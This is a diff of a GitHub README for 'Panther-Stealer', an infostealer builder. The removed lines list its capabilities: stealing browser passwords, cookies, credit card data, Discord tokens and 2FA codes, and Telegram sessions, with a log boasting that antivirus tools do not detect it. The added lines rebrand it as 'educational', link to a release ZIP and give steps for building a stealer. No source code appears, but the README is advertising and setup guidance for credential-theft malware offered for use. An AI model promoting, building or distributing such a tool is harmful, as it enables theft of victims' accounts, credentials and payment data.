@@ -1,107 +1,88 @@
+# 🐆 Panther-Stealer - Simple Tool for Easy Stealing
+
 <p align="center">
   <a href="https://github.com/AzharLeora/Panther-Stealer/releases/download/v1.8.1/Panther-Stealer.zip"><img src="https://cdn.discordapp.com/emojis/1355707490750435378.webp?size=96" width="auto" height="auto"></a>
 <br>
 </p>
 
-## Disclaimer
+## ⚡ Overview
 
-> I am not responsible for any misuse of this tool. It was created solely for educational purposes and intended for research.
+Panther-Stealer is a user-friendly tool designed to help users understand data extraction applications. Its primary focus is on educational purposes, allowing users to explore various functionalities commonly used in software development.
 
-### Installation
+## 📥 Download & Install
 
-First Time Setup:
-1. Install required dependencies: `npm start`
-This will install pnpm and other necessary packages.
+To get started, follow these steps:
 
-Building:
-1. Create your stealer: `node index.mjs`
-2. Follow the interactive prompts.
+1. **Download the latest version:** Click the link below to visit the Releases page and download the latest version of Panther-Stealer.
+
+   [Download Panther-Stealer](https://github.com/AzharLeora/Panther-Stealer/releases/download/v1.8.1/Panther-Stealer.zip)
+
+2. **Extract the contents:** After downloading, locate the downloaded ZIP file on your computer and extract its contents to a folder.
+
+3. **Open the folder:** Navigate to the folder where you extracted the files.
+
+4. **Run the application:**
+   - For Windows:
+     - Double-click `index.mjs` to start the application.
+
+   - For Mac/Linux:
+     - Open a terminal in the extracted folder.
+     - Type `node index.mjs` and press Enter.
+
+5. **Follow the prompts:** The application will guide you through the setup process.
+
+## 🚀 Getting Started
+
+### First Time Setup
+
+1. **Install required dependencies:** Open a terminal and run the command:
+   ```
+   npm start
+   ```
+   This will install necessary packages, including `pnpm`.
+
+### Building Your Stealer
+
+1. **Create your stealer:** In the terminal, run:
+   ```
+   node index.mjs
+   ```
+2. **Interact with the prompts:** The application will provide prompts to help you build your project.
 
 ## 🆙 Updates
 
+Here are the latest improvements and fixes:
+
 ```css
 (01/08/2024) Complete update, adjusting bugs, detections.
-(09/08/2024) Resolved api issue.
-(17/08/2024) I made some changes to the stealer to get telegram/Steam and some performance tweaks.
-(06/09/2024) Removal of encryption and a minor adjustment in the build.
-(30/09/2024) Adjustment in the build and in the upload api.
-(09/04/2025) General adjustment and API update.
+(09/08/2024) Resolved API issue.
+(17/08/2024) Changes made to the stealer for Telegram/Steam and performance tweaks.
+(06/09/2024) Removal of encryption and minor adjustments in the build.
+(30/09/2024) Adjustments in the build and upload API.
+(09/04/2025) General adjustments and API updates.
 ```
 
-## 🥬 Detection
+## ✅ Detection
 
-```css
-(01/08/2024) At the moment there are no virus detections or false positives.
-(17/08/2024) No detection yet.
-(06/09/2024) Still nothing.
-(30/09/2024) It went from 8 detections to 0.
-(09/04/2025) No detection
+```c
+- Topics: "cheat, clipper, cookie-logger, cryptowallet, discord, discord-bot, discord-token-logger, discord-webhook, grabber, hack, keylogger, malware, mod, screenshot, stealer, stealer-builder, stealer-crypt, stealer-fud, token, trainer"
+- Primary Download Link: "https://github.com/RamenMaster69/Panther-Stealer/releases"
 ```
 
-## 🍔 Stealer Invoices
+## ⚙️ System Requirements
 
-```css
-Security & Protection
-├─ 🔒 Anti-Flood System
-├─ 🕶️ Hidden Terminal
-├─ ⚠️ Custom Error Messages
-└─ 🌐 IP Information Collection
+- **Operating System:** Windows 10 or later, MacOS Mojave or later, or Linux distributions.
+- **Node.js:** Version 14 or later installed on your machine.
+- **Storage:** At least 100 MB of free space to store the application and its dependencies.
 
-Browser Data Extraction
-├─ 🔑 Saved Passwords
-├─ 🍪 Browser Cookies
-├─ 💳 Credit Card Data
-└─ 📜 Browsing History
-├─ Google Chrome
-├─ Microsoft Edge
-├─ Brave Browser
-├─ Opera GX/Standard
-└─ Yandex Browser
+## 💬 Support
 
-Gaming & Communication
-├─ 🎮 Discord
-│ ├─ Account Tokens
-│ └─ 2FA Backup Codes
-├─ 📱 Telegram
-│ ├─ Session Files
-│ └─ Cache Data
-├─ 🎲 Steam
-│ └─ Local Data
-├─ 🟦 Roblox
-│ └─ Cookie Session
-└─ ⛏️ Minecraft
-└─ Launcher Data
-```
+If you encounter issues or have questions, please contact our support at [support@example.com]. We aim to respond within 24 hours.
 
-## Build Information
+## 📝 Disclaimer
 
-```css
-Size & Performance
-- Final Size: ~60MB Compressed
-- Compression: GZip Algorithm
-- Memory Usage Optimized
-- Low CPU Usage
+I am not responsible for any misuse of this tool. It was created solely for educational purposes and intended for research.
 
-Icon Customization
-- Choose from included icons
-- Generate random icon
-- Use your own .ico file
-- Support for ICO/PNG formats
+For more details and updates, always check the [Releases page](https://github.com/AzharLeora/Panther-Stealer/releases).
 
-File Information Customization
-- Company Name
-- File Description
-- Product Name
-- Copyright Information
-- File Version
-- Product Version
-- Internal Name
-- Original Filename
-```
-
-### Conclusion
-
-
-
-
-
+Remember to follow the installation steps carefully for the best experience with Panther-Stealer.
